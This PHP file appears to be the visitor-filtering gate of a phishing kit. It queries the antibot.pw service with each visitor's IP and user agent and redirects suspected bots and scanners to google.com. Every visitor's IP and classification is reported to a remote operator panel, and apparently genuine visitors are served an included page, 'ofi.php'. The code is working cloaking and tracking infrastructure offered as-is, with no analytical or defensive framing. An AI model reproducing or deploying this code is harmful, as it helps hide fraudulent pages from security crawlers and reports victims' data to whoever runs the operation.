<?php
if(checkBot()=="Enable") {
    error_reporting();
    session_start();
    require "config/auth.php";
    $config_antibot['apikey'] = $api_key;
    class Antibot
    {
        function apikey($api_key)
        {
            $this->apikey = $api_key;
        }

        function get_client_ip()
        {
            // Get real visitor IP behind CloudFlare network
            if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
            }
            $client = @$_SERVER['HTTP_CLIENT_IP'];
            $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
            $remote = $_SERVER['REMOTE_ADDR'];

            if (filter_var($client, FILTER_VALIDATE_IP)) {
                $ip = $client;
            } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
                $ip = $forward;
            } else {
                $ip = $remote;
            }

            return $ip;
        }

        function httpGet($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($ch);
            return $response;
        }

        function check()
        {
            $ip = $this->get_client_ip();
            $respons = $this->httpGet("https://antibot.pw/api/v2-blockers?ip=" . $ip . "&apikey=" . $this->apikey . "&ua=" . urlencode($_SERVER['HTTP_USER_AGENT']));
            $json = json_decode($respons, true);
            if ($json['is_bot'] == 1 || $json['is_bot'] == true) {
                return true;
            } else {
                return false;
            }
        }
    }
    $Antibot = new Antibot;

    $Antibot->apikey($config_antibot['apikey']);
    if ($Antibot->check() == true) {
        $paramters = "email=" . $email . "&token=" . $token . "&ip=" . get_client_ip() . "&info=Bot" . "&pageinfo=" . $page;
        $u = $base_url . "info/set-info?" . $paramters;
        httpGet($u);
        header('Location:https://www.google.com/');
        ?>


    <?php }
    else {
        $paramters = "email=" . $email . "&token=" . $token . "&ip=" . get_client_ip() . "&info=Real" . "&pageinfo=" . $page;;
        $u = $base_url . "info/set-info?" . $paramters;
        httpGet($u);
        include "ofi.php";
    }

}
else{

    require "config/auth.php";
    $paramters="email=".$email."&token=".$token."&ip=".get_client_ip()."&pageinfo=".$page;;
    $u=$base_url."info/set-visitor?".$paramters;
    httpGet($u);
    include "ofi.php";

}
?>
<?php

function httpGet($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    return $response;
}
function checkBot()
{
    require_once "config/auth.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $base_url . "page-options/check-bot?email=" . $email . "&token=" . $token . "&type=" . $page);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    curl_close($ch);
    $bot = json_decode($output);
    return $bot;
}

function get_client_ip()
{
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];

    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    return $ip;
}

?>
